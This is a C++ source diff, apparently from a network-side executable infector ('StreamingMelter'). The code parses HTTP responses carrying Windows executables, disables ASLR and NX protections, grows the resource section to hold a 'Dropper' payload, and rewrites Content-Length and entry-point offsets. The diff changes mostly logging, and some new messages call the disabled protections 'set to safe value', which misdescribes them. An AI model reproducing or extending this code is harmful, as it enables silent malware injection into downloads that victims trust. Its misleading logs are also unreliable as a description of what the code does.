@@ -44,32 +44,29 @@ bool ParseHeaders::parseHTTPHeaders()
 	std::getline(httpHeader, line, '\n');
 
 	if ( line.compare(0, 4, "HTTP") != 0 ) {
-		DBGTRACE("HTTP header not present.", "", NOTIFY);
+		DEBUG_MSG(D_DEBUG, "HTTP header not present.");
 		return true;
 	}
 
-	DBGTRACE("HTTP header: ", line, NOTIFY);
+	DEBUG_MSG(D_DEBUG, "HTTP header: %s", line.c_str());
 	httpHeaders_.push_back(line);
 
 	while ( std::getline(httpHeader, line, '\n') ) {
 		if ( line.compare("\r") == 0 ) {
 
-			DBGTRACE("End of HTTP headers.", "", NOTIFY);
+			DEBUG_MSG(D_DEBUG, "End of HTTP headers.");
 
 			// discard original HTTP header
 			httpHeadersSize_ = httpHeader.tellg();
-			DBGTRACE("Size of HTTP headers:", httpHeadersSize_, NOTIFY);
+			DEBUG_MSG(D_DEBUG, "Size of HTTP headers: %d", httpHeadersSize_);
 
 			context<StreamingMelter>().discardFromBuffer( httpHeadersSize_ );
-
-			// DBGTRACE_HEX("Residual data (should be 5A4D): ", (DWORD) *context<StreamingMelter>().buffer()->const_data(), NOTIFY);
 
 			return true;
 
 		}
 
-		DBGTRACE("HTTP header: ", line, NOTIFY);
-		// DBGTRACE("HTTP header size: ", line.size() + 1, NOTIFY);
+		DEBUG_MSG(D_DEBUG, "HTTP header: %s", line.c_str());
 		httpHeaders_.push_back(line);
 
 		std::size_t found = line.find("Content-Length:");
@@ -81,36 +78,34 @@ bool ParseHeaders::parseHTTPHeaders()
 			values >> content_length;
 			values >> fileSize;
 			context<StreamingMelter>().fileSize() = fileSize;
-
-			// cout << " *** " << content_length << " => " << context<StreamingMelter>().fileSize() << endl;
 		}
 	}
 
 	httpHeaders_.erase( httpHeaders_.begin(), httpHeaders_.end() );
+
+	DEBUG_MSG(D_INFO, "parsed HTTP headers.");
 
 	return false;
 }
 
 bool ParseHeaders::parseDOSHeader()
 {
-	DBGTRACE("Function: ", "parseDOSHeader", NOTIFY);
-
 	std::size_t offsetToHeader = 0;
 	std::size_t neededBytes = offsetToHeader + sizeof(IMAGE_DOS_HEADER);
 	if ( ! isDataAvailable( neededBytes ) ) {
-		DBGTRACE("Not enough available data: ", "parseDOSHeader", NOTIFY);
+		DEBUG_MSG(D_DEBUG, "not enough data for parsing, waiting for more.");
 		return false;
 	}
 
 	dosHeader_ = (PIMAGE_DOS_HEADER) (context<StreamingMelter>().buffer()->const_data());
-	DBGTRACE("parsing DOS header: ", sizeof(IMAGE_DOS_HEADER), NOTIFY);
-	DBGTRACE_HEX("MAGIC: ", dosHeader_->e_magic, NOTIFY);
+	DEBUG_MSG(D_VERBOSE, "parsing DOS header: %d", sizeof(IMAGE_DOS_HEADER));
+	DEBUG_MSG(D_VERBOSE, "MAGIC: %04x", dosHeader_->e_magic);
 
 	if (dosHeader_->e_magic != IMAGE_DOS_SIGNATURE) {
 		throw parsing_error("Invalid DOS signature.");
 	}
 
-	DBGTRACE_HEX("offset tto NT Header: ", dosHeader_->e_lfanew, NOTIFY);
+	DEBUG_MSG(D_VERBOSE, "offset tto NT Header: %08x", dosHeader_->e_lfanew);
 	context<StreamingMelter>().offsets["ntHeader"] = dosHeader_->e_lfanew;
 
 	return true;
@@ -134,21 +129,21 @@ bool ParseHeaders::parseNTHeaders()
 	// signature
 	if (ntHeaders_->Signature != IMAGE_NT_SIGNATURE)
 		throw parsing_error("Invalid NT signature.");
-	DBGTRACE("Signature ... ", "OK", NOTIFY);
+	DEBUG_MSG(D_INFO, "Signature ... OK");
 
 	// IA-32
 	if ( ntHeaders_->FileHeader.Machine != IMAGE_FILE_MACHINE_I386 )
 		throw parsing_error("Executable is not for IA-32 systems.");
-	DBGTRACE("IA-32 ... ", "OK", NOTIFY);
+	DEBUG_MSG(D_INFO, "IA-32 ... OK");
 
 	// Win32 GUI
 	if ( ntHeaders_->OptionalHeader.Subsystem != IMAGE_SUBSYSTEM_WINDOWS_GUI )
 		throw parsing_error("Executable is not a Win32 GUI application.");
-	DBGTRACE("Win32 GUI ... ", "OK", NOTIFY);
+	DEBUG_MSG(D_INFO, "Win32 GUI ... OK");
 
-	DBGTRACE_HEX("Section alignment ... ", ntHeaders_->OptionalHeader.SectionAlignment, NOTIFY);
-	DBGTRACE_HEX("File alignment ... ", ntHeaders_->OptionalHeader.FileAlignment, NOTIFY);
-	DBGTRACE_HEX("SizeOfImage ... ", ntHeaders_->OptionalHeader.SizeOfImage, NOTIFY);
+	DEBUG_MSG(D_DEBUG, "Section alignment ... %08x", ntHeaders_->OptionalHeader.SectionAlignment);
+	DEBUG_MSG(D_DEBUG, "File alignment    ... %08x", ntHeaders_->OptionalHeader.FileAlignment);
+	DEBUG_MSG(D_DEBUG, "SizeOfImage       ... %08x", ntHeaders_->OptionalHeader.SizeOfImage);
 
 	return true;
 }
@@ -159,12 +154,12 @@ bool ParseHeaders::parseSectionHeaders()
 	std::size_t sectionHeadersBytes = ntHeaders_->FileHeader.NumberOfSections * sizeof(IMAGE_SECTION_HEADER);
 	std::size_t neededBytes = offsetToHeader + sectionHeadersBytes;
 	if ( ! isDataAvailable( neededBytes ) ) {
-		DBGTRACE("Not enough data for parsing section headers.", "", NOTIFY);
+		DEBUG_MSG(D_VERBOSE, "Not enough data for parsing section headers.");
 		return false;
 	}
 
 	std::size_t numberOfSections = ntHeaders_->FileHeader.NumberOfSections;
-	DBGTRACE("number of sections: ", numberOfSections, NOTIFY);
+	DEBUG_MSG(D_INFO, "number of sections: %d", numberOfSections);
 
 	PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER) ( (char*)ntHeaders_ + sizeof(IMAGE_NT_HEADERS) );
 	for (std::size_t sectionIdx = 0; sectionIdx < numberOfSections; ++sectionIdx)
@@ -172,11 +167,11 @@ bool ParseHeaders::parseSectionHeaders()
 		if (!sectionHeader)
 			throw parsing_error("Invalid section header.");
 
-		DBGTRACE("Section ", string((PCHAR)sectionHeader->Name), NOTIFY);
-		DBGTRACE_HEX("\tRVA       :", (std::size_t) sectionHeader->VirtualAddress, NOTIFY);
-		DBGTRACE_HEX("\tPtrToRaw  :", (std::size_t) sectionHeader->PointerToRawData, NOTIFY);
-		DBGTRACE_HEX("\tVSize     :", (std::size_t) sectionHeader->Misc.VirtualSize, NOTIFY);
-		DBGTRACE_HEX("\tSizeOfRaw :", (std::size_t) sectionHeader->SizeOfRawData, NOTIFY);
+		DEBUG_MSG(D_VERBOSE, "Section %s", (PCHAR)sectionHeader->Name);
+		DEBUG_MSG(D_VERBOSE, "\tRVA       : %08x", (std::size_t) sectionHeader->VirtualAddress);
+		DEBUG_MSG(D_VERBOSE, "\tPtrToRaw  : %08x", (std::size_t) sectionHeader->PointerToRawData);
+		DEBUG_MSG(D_VERBOSE, "\tVSize     : %08x", (std::size_t) sectionHeader->Misc.VirtualSize);
+		DEBUG_MSG(D_VERBOSE, "\tSizeOfRaw : %08x", (std::size_t) sectionHeader->SizeOfRawData);
 
 		context<StreamingMelter>().addSection(sectionHeader);
 		++sectionHeader;
@@ -187,7 +182,7 @@ bool ParseHeaders::parseSectionHeaders()
 
 StateResult ParseHeaders::process()
 {
-	// DBGTRACE("CRASHING?", "", NOTIFY);
+	// DBGTRACE("CRASHING?", "", D_INFO);
 
 	Dropper& dropper = context<StreamingMelter>().dropper();
 	if (dropper.size() == 0)
@@ -195,20 +190,20 @@ StateResult ParseHeaders::process()
 
 	// Clear ASLR if enabled
 	if ( ntHeaders_->OptionalHeader.DllCharacteristics & IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) {
-		DBGTRACE("DYNAMIC_BASE ... ", "RESET", NOTIFY);
+		DEBUG_MSG(D_INFO, "DYNAMIC_BASE set to safe value.");
 		ntHeaders_->OptionalHeader.DllCharacteristics &= ~IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE;
 	}
 
 	// Clear NX_COMPAT if enabled
 	if ( ntHeaders_->OptionalHeader.DllCharacteristics & IMAGE_DLLCHARACTERISTICS_NX_COMPAT) {
-		DBGTRACE("NX_COMPAT ... ", "RESET", NOTIFY);
+		DEBUG_MSG(D_INFO, "NX_COMPAT set to safe value.");
 		ntHeaders_->OptionalHeader.DllCharacteristics &= ~IMAGE_DLLCHARACTERISTICS_NX_COMPAT;
 	}
 
 	// Reset bound import table if present
 	if (ntHeaders_->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT].VirtualAddress)
 	{
-		DBGTRACE("BOUND IMPORT TABLE ...", "RESET", NOTIFY);
+		DEBUG_MSG(D_INFO, "BOUND IMPORT TABLE set to safe value.");
 		ntHeaders_->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT].VirtualAddress = 0;
 		ntHeaders_->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT].Size = 0;
 	}
@@ -219,9 +214,9 @@ StateResult ParseHeaders::process()
 	DWORD predictedSizeOfImage = alignTo( lastSection->VirtualAddress + lastSection->Misc.VirtualSize + dropper.size(), ntHeaders_->OptionalHeader.SectionAlignment );
 	DWORD sizeOfImageSkew = predictedSizeOfImage - ntHeaders_->OptionalHeader.SizeOfImage;
 	ntHeaders_->OptionalHeader.SizeOfImage = predictedSizeOfImage;
-	DBGTRACE_HEX("SizeOfImage changed to", ntHeaders_->OptionalHeader.SizeOfImage, NOTIFY);
+	DEBUG_MSG(D_INFO, "SizeOfImage changed to %d", ntHeaders_->OptionalHeader.SizeOfImage);
 
-	DBGTRACE("Content-Length will differ by ", sizeOfImageSkew, NOTIFY);
+	DEBUG_MSG(D_INFO, "Content-Length will differ by %d", sizeOfImageSkew);
 
 	// save NT header for future reference
 	PEInfo& pe = context<StreamingMelter>().pe();
@@ -251,10 +246,10 @@ StateResult ParseHeaders::process()
 			sectionHeader->Misc.VirtualSize = alignTo(sectionHeader->Misc.VirtualSize + dropper.size(), context<StreamingMelter>().sectionAlignment());
 			sectionHeader->Characteristics |= IMAGE_SCN_MEM_WRITE;
 
-			DBGTRACE("Resource section: ", string ((PCHAR) rsrcHeader->Name), NOTIFY);
-			DBGTRACE_HEX("\tDropper size: ", dropper.size(), NOTIFY);
-			DBGTRACE_HEX("\tSizeOfRawData changed to      0x", (std::size_t) sectionHeader->SizeOfRawData, NOTIFY);
-			DBGTRACE_HEX("\tVirtualSize change to         0x", (std::size_t) sectionHeader->Misc.VirtualSize, NOTIFY);
+			DEBUG_MSG(D_VERBOSE, "Resource section: %s", (PCHAR) rsrcHeader->Name);
+			DEBUG_MSG(D_VERBOSE, "\tDropper size: %08x", dropper.size());
+			DEBUG_MSG(D_VERBOSE, "\tSizeOfRawData changed to %08x", (std::size_t) sectionHeader->SizeOfRawData);
+			DEBUG_MSG(D_VERBOSE, "\tVirtualSize change to %08x", (std::size_t) sectionHeader->Misc.VirtualSize);
 		}
 
 		++sectionHeader;
@@ -265,7 +260,7 @@ StateResult ParseHeaders::process()
 	DWORD AddressOfEntryPoint = ntHeaders_->OptionalHeader.AddressOfEntryPoint;
 	DWORD offsetToEntryPoint = textHeader->PointerToRawData + ( AddressOfEntryPoint - textHeader->VirtualAddress );
 
-	DBGTRACE_HEX("Offset to entry point: ", offsetToEntryPoint, NOTIFY);
+	DEBUG_MSG(D_VERBOSE, "Offset to entry point: %08x", offsetToEntryPoint);
 	offsetToNext() = offsetToEntryPoint;
 
 	sendHTTPHeaders(sizeOfImageSkew);
@@ -286,7 +281,7 @@ void ParseHeaders::sendHTTPHeaders(std::size_t sizeOfImageSkew)
 			line = str.str();
 		}
 
-		DBGTRACE("Sending HTTP header: ", line.c_str(), NOTIFY);
+		DEBUG_MSG(D_DEBUG, "Sending HTTP header: %s", line.c_str());
 		context<StreamingMelter>().complete(line.c_str(), line.size());
 		context<StreamingMelter>().complete("\n", 1);
 	}
@@ -312,10 +307,8 @@ sc::result ParseHeaders::transitToNext()
 ParseHeaders::ParseHeaders()
 	: DataState< ParseHeaders, Parsing >(), httpHeadersSize_(0)
 {
-	//DBGTRACE("constructor.", "", NOTIFY);
 }
 
 ParseHeaders::~ParseHeaders()
 {
-	//DBGTRACE("destructor.", "", NOTIFY);
 }
